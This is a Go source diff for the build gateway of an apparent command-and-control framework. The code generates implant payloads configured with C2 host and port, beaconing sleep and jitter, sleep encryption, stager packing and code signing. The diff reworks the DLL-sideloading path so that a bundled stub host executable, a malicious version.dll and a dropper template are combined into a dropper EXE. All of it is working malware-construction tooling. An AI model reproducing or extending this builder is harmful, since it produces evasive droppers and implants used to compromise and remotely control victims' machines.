@@ -248,18 +248,6 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 	isDLL := strings.Contains(featuresArg, "dll-sideload")
 
-	sideloadExe := os.Getenv("DM_SIDELOAD_EXE")
-	if sideloadExe == "" {
-		sideloadExe = "/sideload/Setup.exe"
-	}
-	if isDLL {
-		if _, err := os.Stat(sideloadExe); err != nil {
-			g.log.Error("sideload EXE not found — copy it first", zap.String("path", sideloadExe))
-			setBuildStatus("failed", "", "")
-			return
-		}
-	}
-
 	buildVolume := os.Getenv("DM_BUILD_VOLUME")
 	if buildVolume == "" {
 		buildVolume = "dungeonmaster_build_artifacts"
@@ -285,7 +273,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
 		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
 			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-			sleepEncryptStr, payloadFeatures, campaignID, false, "", false, "")
+			sleepEncryptStr, payloadFeatures, campaignID, false, "", false)
 
 		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
 		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -344,7 +332,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject, isDLL, sideloadExe)
+		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject, isDLL)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -357,14 +345,15 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 	}
 
 	if isDLL {
-		// DLL sideload: extract DLL + dropper template, inject payload in Go, upload dropper EXE.
+		// DLL sideload: extract DLL + dropper template + stub host, inject payload in Go, upload dropper EXE.
 		dllTmp := "/artifacts/" + buildID + "-dll.tmp"
 		dropperTmp := "/artifacts/" + buildID + "-dropper.tmp"
+		hostTmp := "/artifacts/" + buildID + "-host.tmp"
 		extractCmd := exec.CommandContext(ctx,
 			"docker", "run", "--rm",
 			"-v", buildVolume+":/out",
 			imageTag, "sh", "-c",
-			"cp /version.dll /out/"+buildID+"-dll.tmp && cp /dm-dropper.exe /out/"+buildID+"-dropper.tmp",
+			"cp /version.dll /out/"+buildID+"-dll.tmp && cp /dm-dropper.exe /out/"+buildID+"-dropper.tmp && cp /sideload-host.exe /out/"+buildID+"-host.tmp",
 		)
 		if err := extractCmd.Run(); err != nil {
 			g.log.Error("docker extract (dll) failed", zap.String("build_id", buildID), zap.Error(err))
@@ -387,14 +376,15 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 			setBuildStatus("failed", "", "")
 			return
 		}
-		setupBytes, err := os.ReadFile(sideloadExe)
+		hostBytes, err := os.ReadFile(hostTmp)
+		os.Remove(hostTmp)
 		if err != nil {
-			g.log.Error("read sideload exe", zap.String("path", sideloadExe), zap.Error(err))
+			g.log.Error("read sideload host exe", zap.String("build_id", buildID), zap.Error(err))
 			setBuildStatus("failed", "", "")
 			return
 		}
 
-		dropper := buildDropper(templateBytes, dllBytes, setupBytes)
+		dropper := buildDropper(templateBytes, dllBytes, hostBytes)
 		outPath := "/artifacts/" + buildID + ext
 		if err := os.WriteFile(outPath, dropper, 0644); err != nil {
 			g.log.Error("write dropper", zap.String("build_id", buildID), zap.Error(err))
@@ -500,7 +490,7 @@ func appendU32LE(b []byte, v uint32) []byte {
 func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 	regPath, pollPath string, sleepSecs, jitterPct int,
 	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
-	packStager bool, signSubject string, isDLL bool, sideloadExe string) []string {
+	packStager bool, signSubject string, isDLL bool) []string {
 
 	packStr := "false"
 	if packStager {
